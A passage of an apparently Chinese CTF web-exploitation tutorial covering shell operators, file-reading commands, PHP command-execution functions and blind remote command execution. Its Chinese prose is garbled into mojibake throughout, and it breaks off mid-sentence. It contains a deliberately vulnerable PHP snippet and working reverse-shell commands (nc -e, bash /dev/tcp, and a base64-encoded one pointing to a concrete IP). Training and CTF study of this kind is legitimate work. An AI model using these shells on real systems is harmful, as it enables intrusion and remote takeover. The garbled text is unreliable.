id="ç³»ç»Ÿå‘½ä»¤ç®€ä»‹">ç³»ç»Ÿå‘½ä»¤ç®€ä»‹</h2><p>ç³»ç»Ÿå‘½ä»¤ï¼Œç®€å•è§£é‡Šå°±æ˜¯åœ¨ç³»ç»Ÿç»ˆç«¯å¯æ‰§è¡Œçš„é¢„å®šä¹‰å‘½ä»¤ï¼Œå°±æ˜¯å¤§å®¶å¸¸è§çš„é»‘æ¡†æ¡†ã€‚åœ¨linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œé¢„å®šä¹‰å‘½ä»¤é»˜è®¤å­˜å‚¨ä½ç½®ä¸º/binç›®å½•ï¼Œè€Œwindowsæ“ä½œç³»ç»Ÿçš„é¢„å®šä¹‰å‘½ä»¤é»˜è®¤å­˜å‚¨ä½ç½®ä¸ºC:\Windows\System32ï¼Œä¸‹é¢å°†é’ˆå¯¹linuxå’Œwinçš„ç³»ç»Ÿå‘½ä»¤åšç®€å•ä»‹ç»ã€‚</p><h3 id="ç®¡é“ç¬¦">ç®¡é“ç¬¦</h3><p>åœ¨winå’Œlinuxè¿™ä¸¤ç§æ“ä½œç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç®¡é“ç¬¦æ¥åŒæ—¶æ‰§è¡Œå¤šæ¡å‘½ä»¤</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windowsï¼š</span><br><span class="line">â€˜<span class="string">|â€™ ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span></span><br><span class="line">â€˜<span class="string">||â€™ å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</span></span><br><span class="line">â€˜<span class="meta">&amp;â€™ å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span></span><br><span class="line"><span class="meta">&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</span></span><br><span class="line"></span><br><span class="line">linuxï¼š</span><br><span class="line">Linuxç³»ç»ŸåŒ…å«äº†windowsç³»ç»Ÿä¸Šé¢å››ä¸ªä¹‹å¤–ï¼Œè¿˜å¤šäº†ä¸€ä¸ª â€˜;â€™ è¿™ä¸ªä½œç”¨å’Œ â€˜<span class="meta">&amp;â€™ ä½œç”¨ç›¸åŒ</span></span><br></pre></td></tr></table></figure><h3 id="é€šé…ç¬¦">é€šé…ç¬¦</h3><p>åœ¨linuxæ“ä½œç³»ç»Ÿä¸­æ”¯æŒå¦‚ä¸‹ä¸¤ç§é€šé…ç¬¦</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?   å¯ä»£æ›¿ä»»æ„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"><span class="bullet">*   </span>å¯ä»£æ›¿0-ä»»æ„ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure><p><strong>ä¾‹</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è‹¥å½“å‰ç›®å½•åªå­˜åœ¨ä¸€ä¸ªåä¸ºflagçš„æ–‡ä»¶</span><br><span class="line"><span class="built_in">cat</span> flag &lt;==&gt; <span class="built_in">cat</span> fla?  &lt;==&gt;  <span class="built_in">cat</span> f*</span><br></pre></td></tr></table></figure><h3 id="é‡å®šå‘">é‡å®šå‘</h3><p>åœ¨linuxæ“ä½œç³»ç»Ÿä¸­ä¸€å…±æœ‰&gt;å’Œ&gt;&gt;ä¸¤ä¸ªé‡å®šå‘ç¬¦å·</p><p><strong>1.&gt;ç¬¦å·</strong></p><p>ç”¨äºå°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šè¦†ç›–æ–‡ä»¶å†…å®¹ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt; <span class="keyword">file</span>.txt    //å°†<span class="keyword">ls</span>çš„æ‰§è¡Œç»“æœå†™å…¥<span class="keyword">file</span>.txtä¸­</span><br><span class="line">&gt;<span class="keyword">file</span>.txt        //åˆ›å»ºåä¸º<span class="keyword">file</span>.txtçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><strong>2.&gt;&gt;ç¬¦å·</strong></p><p>å°†å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œä½†ä¸<code>&gt;</code> ä¸åŒçš„æ˜¯ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œ<code>&gt;&gt;</code> ä¼šå°†è¾“å‡ºè¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾è€Œä¸æ˜¯è¦†ç›–æ–‡ä»¶å†…å®¹ã€‚</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt;&gt; <span class="keyword">file</span>.txt</span><br></pre></td></tr></table></figure><h3 id="å¸¸è§ç³»ç»Ÿå‘½ä»¤">å¸¸è§ç³»ç»Ÿå‘½ä»¤</h3><p>åœ¨é«˜çº§è¯­è¨€å½“ä¸­ï¼Œç³»ç»Ÿå‘½ä»¤é€šå¸¸éœ€è¦ç‰¹å®šçš„å‡½æ•°æ‰èƒ½æ‰§è¡Œã€‚ä¾‹å¦‚phpä¸­çš„</p><table><thead><tr><th style="text-align:center">system()</th></tr></thead><tbody><tr><td style="text-align:center">passthru()</td></tr><tr><td style="text-align:center">exec()</td></tr><tr><td style="text-align:center">shell_exec()</td></tr><tr><td style="text-align:center">popen()</td></tr><tr><td style="text-align:center">proc_open()</td></tr><tr><td style="text-align:center">pcntl_exec()</td></tr><tr><td style="text-align:center">``</td></tr></tbody></table><p>pythonä¸­çš„ä¾‹å¦‚ç­‰</p><table><thead><tr><th style="text-align:center">os.system()</th></tr></thead></table><p>æ ¹æ®å‡½æ•°ä¸åŒï¼Œå…¶æ‰€éœ€å‚æ•°ä»¥åŠå›æ˜¾æƒ…å†µç­‰éƒ½ä¼šç•¥æœ‰ä¸åŒï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´</p><h4 id="windows">windows</h4><table><thead><tr><th>å‘½ä»¤</th><th>å®é™…æ•ˆæœ</th></tr></thead><tbody><tr><td>ipconfig</td><td>ä¸»è¦ç”¨æ¥æŸ¥çœ‹å½“å‰æœºå™¨å†…ã€å¤–ç½‘ip</td></tr><tr><td>type</td><td>type filename æŸ¥çœ‹æ–‡ä»¶å†…å®¹</td></tr><tr><td>cd</td><td>ç›®å½•è·³è½¬</td></tr><tr><td>ping</td><td>ping ipæˆ–è€…url ä¸»è¦ç”¨æ¥åˆ¤æ–­æŸæœºå™¨æ˜¯å¦å¯è¾¾</td></tr><tr><td>dir</td><td>åˆ—å‡ºå½“å‰ç›®å½•</td></tr><tr><td>whoami</td><td>æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼Œä¸»è¦ç”¨äºåˆ¤æ–­æ˜¯å¦å¯ä»¥å‘½ä»¤æ‰§è¡Œ</td></tr></tbody></table><h4 id="linux">linux</h4><p><strong>åŸºç¡€å‘½ä»¤</strong></p><table><thead><tr><th>å‘½ä»¤</th><th>å®é™…æ•ˆæœ</th></tr></thead><tbody><tr><td>ls</td><td>åˆ—å‡ºå½“å‰ç›®å½•</td></tr><tr><td>cd</td><td>ç›®å½•è·³è½¬</td></tr><tr><td>rm</td><td>åˆ é™¤</td></tr><tr><td>mv</td><td>é‡å‘½å</td></tr><tr><td>whoami</td><td>æŸ¥çœ‹å½“å‰ç”¨æˆ·</td></tr><tr><td>uname -a</td><td>åˆ—å‡ºå†…æ ¸ç‰ˆæœ¬ç­‰è¯¦ç»†ç³»ç»Ÿè®¯æ¯</td></tr><tr><td>ifconfig</td><td>æŸ¥çœ‹å½“å‰æœºå™¨å†…å¤–ç½‘ip</td></tr><tr><td>ping</td><td>åˆ¤æ–­ç›®æ ‡æœºå™¨æ˜¯å¦å¯è¾¾</td></tr><tr><td>touch</td><td>åˆ›å»ºæ–‡ä»¶</td></tr><tr><td>mkdir</td><td>åˆ›å»ºç›®å½•</td></tr></tbody></table><p>åœ¨ctfæ¯”èµ›å½“ä¸­ï¼Œæœ€å¸¸è§çš„å°±æ˜¯æ–‡ä»¶è¯»å–å‘½ä»¤çš„ç»•è¿‡ï¼Œä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„<strong>æ–‡ä»¶è¯»å–å‘½ä»¤</strong></p><table><thead><tr><th>å‘½ä»¤</th><th>å®é™…æ•ˆæœ</th></tr></thead><tbody><tr><td>cat</td><td>æ–‡ä»¶è¯»å–</td></tr><tr><td>tac</td><td>æ–‡ä»¶è¯»å–ï¼ˆè¡Œå€’åºè¾“å‡ºï¼‰</td></tr><tr><td>more</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¸€é¡µä¸€é¡µæ˜¾ç¤ºï¼‰</td></tr><tr><td>less</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¸€é¡µä¸€é¡µæ˜¾ç¤ºï¼Œå¯ç¿»é¡µï¼‰</td></tr><tr><td>head</td><td>æ–‡ä»¶è¯»å–ï¼ˆæ˜¾ç¤ºå¤´å‡ è¡Œï¼‰</td></tr><tr><td>tail</td><td>æ–‡ä»¶è¯»å–ï¼ˆæ˜¾ç¤ºæœ€åå‡ è¡Œï¼‰</td></tr><tr><td>nl</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¼šè¾“å‡ºè¡Œå·ï¼‰</td></tr><tr><td>vim/vi</td><td>æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¯ç”¨äºå†…å®¹æŸ¥çœ‹</td></tr><tr><td>nano</td><td>æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¯ç”¨äºå†…å®¹æŸ¥çœ‹</td></tr><tr><td>emacs</td><td>æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¯ç”¨äºå†…å®¹æŸ¥çœ‹</td></tr><tr><td>sed -n â€˜1,10pâ€™</td><td>æ–‡ä»¶è¯»å–ï¼ˆæ˜¾ç¤ºå‰10è¡Œï¼‰</td></tr><tr><td>rev</td><td>æ–‡ä»¶è¯»å–ï¼ˆå€’åºè¾“å‡ºï¼‰</td></tr><tr><td>base64</td><td>æ–‡ä»¶è¯»å–ï¼ˆä»¥base64å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>strings</td><td>æ–‡ä»¶è¯»å–ï¼ˆæå–æ–‡ä»¶ä¸­å¯è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼‰</td></tr><tr><td>xxd</td><td>æ–‡ä»¶è¯»å–ï¼ˆäºŒè¿›åˆ¶å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>hexdump</td><td>æ–‡ä»¶è¯»å–ï¼ˆ16è¿›åˆ¶å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>od</td><td>æ–‡ä»¶è¯»å–ï¼ˆ8è¿›åˆ¶å½¢å¼è¾“å‡ºï¼‰</td></tr><tr><td>uniq</td><td>æ–‡ä»¶è¯»å–ï¼ˆä¼šå»æ‰é‡å¤è¡Œï¼‰</td></tr><tr><td>cp</td><td>æ–‡ä»¶å¤åˆ¶ï¼ˆå¯ç”¨äºçªç ´ç›®æ ‡æ–‡ä»¶æƒé™é™åˆ¶ï¼‰</td></tr></tbody></table><h4 id="å…¶å®ƒå‘½ä»¤">å…¶å®ƒå‘½ä»¤</h4><p>é™¤äº†ä»¥ä¸Šçš„å¸¸è§å‘½ä»¤å¤–è¿˜æœ‰å…¶å®ƒçš„ä¸€äº›å¸¸ç”¨å‘½ä»¤</p><h5 id="find"><strong>find</strong></h5><p>å¸¸ç”¨äºåœ¨linuxç³»ç»Ÿä¸­æŸ¥æ‰¾æŸæ–‡ä»¶ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰çš„å…·ä½“ä½ç½®</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name flag</span><br><span class="line"><span class="built_in">find</span> / -name f*</span><br><span class="line"><span class="built_in">find</span> / -name fla?</span><br><span class="line">/ä¸ºæŸ¥æ‰¾çš„èµ·å§‹æ ¹ç›®å½•ï¼Œä»¥ä¸Šå‘½ä»¤ä¼šä»¥/ï¼ˆæ ¹ç›®å½•ï¼‰ä¸ºæŸ¥æ‰¾æ ¹ç›®å½•ï¼Œåœ¨å…¶ä»¥åŠå…¶å­ç›®å½•ä¸­æŸ¥æ‰¾ç¬¦åˆåç»­å‘½åè§„åˆ™çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><h5 id="sed"><strong>sed</strong></h5><p>åœ¨æŸäº›æƒ…å†µéœ€è¦å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œé€‚å½“ä¿®æ”¹ï¼Œä½†é¢˜ç›®ç¯å¢ƒå¹¶æœªæä¾›viç­‰æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨sedè¾¾åˆ°ç²¾å‡†æ›¿æ¢æŸè¡Œçš„ç›®çš„</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å®ç°æ ¼å¼ä¸ºï¼š</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;è¡Œæ•°s/åŸå†…å®¹/æ›¿æ¢ä¸ºçš„å†…å®¹/&#x27;</span> æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;2s/x\.x\.x\.x/150.158.24.228/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;3s/7002/7000/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;4s/.*//&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>PSï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.è¯¥å‘½ä»¤æ”¯æŒé€šé…ç¬¦</span><br><span class="line"><span class="attribute">2</span>.è¯¥å‘½ä»¤å¯¹äºç‰¹æ®Šç¬¦å·éœ€è¦ç”¨\è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚ä¸Šè¿°çš„ä¾‹<span class="number">1</span>ä¸­çš„.</span><br></pre></td></tr></table></figure><h5 id="echo"><strong>echo</strong></h5><p>å¦‚æœéœ€è¦å¤§è§„æ¨¡å†™å…¥å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨base64ç¼–ç é˜²æ­¢æ•°æ®ä¸¢å¤±ï¼Œå†ç»“åˆechoå°†å†…å®¹å†™å…¥æŒ‡å®šæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å®ç°æ ¼å¼ä¸ºï¼š</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;base64ç¼–ç çš„æ•°æ®&#x27;</span> | <span class="built_in">base64</span> -d &gt; filename</span><br></pre></td></tr></table></figure><h2 id="äºŒã€å‘½ä»¤æ‰§è¡Œ">äºŒã€å‘½ä»¤æ‰§è¡Œ</h2><h3 id="systemç±»å‘½ä»¤æ‰§è¡Œ">systemç±»å‘½ä»¤æ‰§è¡Œ</h3><p>æ‰€è°“systemç±»å‘½ä»¤æ‰§è¡Œå³æ˜¯åŸé¢˜ç›®å·²ç»ç»™å‡ºsystemå‡½æ•°ï¼Œä¸”å…¶å‚æ•°æ˜¯å¯æ§çš„è¿™ç§æƒ…å†µï¼Œä¸‹é¢å°†ä»¥phpä¸ºä¾‹ç€é‡è®²è§£è¯¥æƒ…å†µä¸‹çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ä»¥åŠç»•è¿‡å§¿åŠ¿</p><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ— å›æ˜¾rce">æ— å›æ˜¾rce</h4><p>åœ¨1.3èŠ‚å¼€ç¯‡æˆ‘ä»¬æåˆ°äº†å¾ˆå¤šå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œä»–ä»¬éƒ½å¯ä»¥è¾¾æˆæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ï¼Œä½†å…¶ä¸­çš„ä¸€äº›å‡½æ•°ä¼šä¸ä¼šå°†æ‰§è¡Œçš„ç»“æœå›æ˜¾ï¼Œä¾‹å¦‚execå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦é€šè¿‡æŸäº›æ‰‹æ³•å¾—åˆ°å›æ˜¾ï¼Œä¸‹é¢å°†å¯¹è¿™äº›æ‰‹æ³•è¿›è¡Œè¯¦ç»†è®²è§£</p><h5 id="åå¼¹shell">åå¼¹shell</h5><h6 id="vpsç®€ä»‹"><strong>vpsç®€ä»‹</strong></h6><p>ä½œä¸ºä¸€ååˆæ ¼çš„webæ‰‹ï¼Œä¸€å°vpsæ˜¯å¿…ä¸å¯å°‘çš„ï¼Œæ‰€è°“vpså°±æ˜¯ä¸€å°å…·æœ‰å…¬ç½‘ipçš„æœåŠ¡å™¨ï¼Œå¯ä»ä¸‹é¢ä¸‰æ–¹å‚å®¶è·å–</p><p>1.åä¸ºäº‘ï¼š<a href="https://www.huaweicloud.com/%EF%BC%88%E4%BA%91%E8%80%80%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://www.huaweicloud.com/ï¼ˆäº‘è€€äº‘æœåŠ¡å™¨ï¼‰</a></p><p>2.è…¾è®¯äº‘ï¼š<a href="https://cloud.tencent.com/%EF%BC%88%E8%BD%BB%E9%87%8F%E5%9E%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://cloud.tencent.com/ï¼ˆè½»é‡å‹æœåŠ¡å™¨ï¼‰</a></p><p>3.é˜¿é‡Œäº‘ï¼š<a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p><p>æœåŠ¡å™¨å’Œæˆ‘ä»¬ä¸ªäººPCç”µè„‘æœ€å¤§çš„åŒºåˆ«å°±æ˜¯å…·æœ‰å…¬ç½‘ipï¼Œå®é™…æ•ˆæœå°±æ˜¯ä»»æ„ç”¨æˆ·çš†å¯è¾¾æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼ˆå¯pingé€šï¼‰ï¼Œè€Œä¸ªäººPCç”µè„‘ç»å¤§å¤šæ•°æƒ…å†µæ˜¯æ— æ³•å®ç°è¯¥åŠŸèƒ½çš„ã€‚è¯¦ç»†è´­ä¹°æµç¨‹ä»¥åŠäº§å“è®¯æ¯å¯ä¸å¯¹åº”å®¢æœæ¢è®¨ï¼ŒæˆåŠŸè´­ä¹°åå³å¯ä½¿ç”¨sshï¼ˆæœåŠ¡å™¨è‡ªå¸¦çš„è¿œç¨‹è¿æ¥å·¥å…·ï¼‰æˆ–ç”µè„‘è‡ªå¸¦çš„è¿œç¨‹æ¡Œé¢åŠŸèƒ½è¿›è¡ŒæœåŠ¡å™¨ç™»å½•</p><p><strong>1.sshç™»å½•</strong></p><p>sshè½¯ä»¶æ¨ètermius</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123171841669.png" alt="image-20240123171841669"></p><p>ä»å‚å®¶è·å–è´¦å·å¯†ç ä»¥åŠå…¬ç½‘ipåå°†å…¶å¡«å…¥1ï¼Œ2ï¼Œ3å¤„ï¼Œç„¶åç‚¹å‡»4å¤„å³å¯è¿œç¨‹è¿æ¥åˆ°æœåŠ¡å™¨</p><p><strong>2.ç”µè„‘è‡ªå¸¦è¿œç¨‹æ¡Œé¢åŠŸèƒ½ç™»å½•</strong>ï¼ˆå¸¸ç”¨äºwinç³»ç»Ÿï¼‰</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172206857.png" alt="image-20240123172206857"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172217584.png" alt="image-20240123172217584"></p><p>åœ¨æ­¤ç•Œé¢è¾“å…¥å…¬ç½‘ipï¼Œç¨åå†è¾“å…¥å‚å®¶ç»™äºˆçš„è´¦å·å¯†ç å³å¯ç™»å½•æˆåŠŸ</p><h6 id="åå¼¹æ‰‹æ³•">åå¼¹æ‰‹æ³•</h6><p><strong>1.ncåå¼¹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">linuxé¶æœº:nc -e <span class="regexp">/bin/</span>bash -lvvnp ç«¯å£</span><br><span class="line">winé¶æœº:nc -e cmd -lvvnp ç«¯å£     <span class="regexp">//</span>winç³»ç»Ÿä¸è‡ªå¸¦ncï¼Œéœ€è¦æ‰‹åŠ¨ä¸Šä¼ ï¼Œæ­¤å¤„ncå¹¶éå›ºå®šï¼Œæ ¹æ®å®é™…ä¸Šä¼ çš„ç¨‹åºååšç›¸åº”ä¿®æ”¹</span><br><span class="line">æ”»å‡»æœº:nc é¶æœºip ç«¯å£</span><br><span class="line"></span><br><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">linuxé¶æœº:nc -e <span class="regexp">/bin/</span>bash æ”»å‡»æœºip ç«¯å£</span><br><span class="line">winé¶æœº:nc -e cmd æ”»å‡»æœºip ç«¯å£</span><br><span class="line">æ”»å‡»æœº:nc -lvvnp ç«¯å£</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>ä¸Šè¿°æ‰€æœ‰æ“ä½œçš†æ˜¯å¸¦æœ‰-lvvnpçš„æ“ä½œï¼ˆç«¯å£ç›‘å¬ï¼‰ä¼˜å…ˆ</span><br></pre></td></tr></table></figure><p><strong>2.bashåå¼¹</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»æœº<span class="symbol">:nc</span> -lvvnp ç«¯å£</span><br><span class="line">é¶æœº<span class="symbol">:bash</span> -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/æ”»å‡»æœºip/æ”»å‡»æœºç›‘å¬çš„ç«¯å£ 0&gt;&amp;1&quot;</span></span><br><span class="line">æ•°ç»„ç‰ˆé¶æœºï¼ˆjavaæºç ï¼‰<span class="symbol">:bash</span> -c &#123;echo,<span class="title class_">YmFzaCAtaSA</span>+<span class="title class_">JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx</span>&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">//ä½¿ç”¨æ—¶éœ€è¦å¯¹å‘½ä»¤ä¸­çš„ç¼–ç éƒ¨åˆ†è§£ç ï¼Œå°†å…¶ä¸­çš„ipå’Œç«¯å£ä¿®æ”¹ä¸ºæ”»å‡»æœºipæ®µç«¯å£åå¹¶é‡æ–°ç¼–ç æ‰å¯ä½¿ç”¨ï¼Œæµè§ˆå™¨ä¼ å‚æ—¶éœ€è¦urlç¼–ç </span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹æ¼”ç¤º</p><p>1.åœ¨é¶æœº**å¯è¾¾çš„æœºå™¨ï¼ˆå¯pingé€šï¼Œå¦‚å…¬ç½‘æœåŠ¡å™¨æˆ–åŒç½‘æ®µæœºå™¨ï¼‰**ä¸Šç›‘å¬ç«¯å£</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174432194.png" alt="image-20240123174432194"></p><p>2.åœ¨é¶æœºä¸Šæ‰§è¡Œbashåå¼¹å‘½ä»¤</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174611797.png" alt="image-20240123174611797"></p><p>3.æŸ¥çœ‹åˆšåˆšç›‘å¬ç«¯å£çš„æœåŠ¡å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174641283.png" alt="image-20240123174641283"></p><p>å¯ä»¥å‘ç°åå¼¹shellæˆåŠŸï¼Œæ­¤æ—¶å¯æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</p><p><strong>3.å†™shellæ–‡ä»¶åæ‰§è¡Œ</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åˆ›å»º<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">bash -<span class="keyword">c</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨ip/ç«¯å£ 0&gt;&amp;1&quot;</span></span><br><span class="line">å°†ä¸Šè¿°bashåå¼¹å‘½ä»¤å†™å…¥æ–‡ä»¶ï¼Œè¯¦è§<span class="number">1.2</span>.<span class="number">3</span>èŠ‚ä¸­çš„<span class="keyword">echo</span>ç”¨æ³•</span><br><span class="line">./<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">åˆ©ç”¨.æ‰§è¡Œ<span class="keyword">shell</span>.<span class="keyword">sh</span>åå¼¹<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p><strong>æ­£å‘è¿æ¥ä¸åå‘è¿æ¥ç®€ä»‹</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172902417.png" alt="image-20240123172902417"></p><p>PC1ã€PC2ã€PC3ä¸ºæˆ‘ä»¬çš„ç›®æ ‡æœºå™¨ï¼Œæ­¤æ—¶ä¸éš¾å‘ç°ä¸‰å°é¶æœºéƒ½å¤„äºå†…ç½‘ç¯å¢ƒ</p><p>æ­£å‘è¿æ¥ï¼šæ”»å‡»æœºä¸»åŠ¨è¿æ¥é¶æœº</p><p>åå‘è¿æ¥ï¼šé¶æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœº</p><p>å‡†åˆ™ï¼šè°è¢«åŠ¨ï¼Œè°ç›‘å¬</p><p>åœ¨ä¸Šè¿°ç¯å¢ƒä¸­ï¼Œæœ‰ä¸”ä»…æœ‰<strong>å¯è®¿é—®è·¯ç”±</strong>ã€<strong>linuxå¤–ç½‘æœåŠ¡å™¨</strong>ã€<strong>windowsæœåŠ¡å™¨</strong>è¿™ä¸‰ä¸ªipæ˜¯å¯è®¿é—®çš„ï¼Œè€Œæˆ‘ä»¬çš„ä¸‰å°PCé¶æœºæ­¤æ—¶å¤„äºå†…ç½‘ç¯å¢ƒï¼Œç›¸å½“äºæˆ‘ä»¬çš„ä¸ªäººPCç”µè„‘ï¼Œæ­¤æ—¶æ˜¯æ— æ³•è®¿é—®çš„ï¼Œæˆ‘ä»¬çš„å¤–ç½‘æœåŠ¡å™¨æœ€å¤šåªå¯è‡´<strong>å¯è®¿é—®è·¯ç”±</strong>å¤„ï¼Œå³æ”»å‡»æœºæ— æ³•ä¸»åŠ¨è¿æ¥åˆ°é¶æœºï¼Œæ‰€ä»¥æ­¤æ—¶å°±æ— 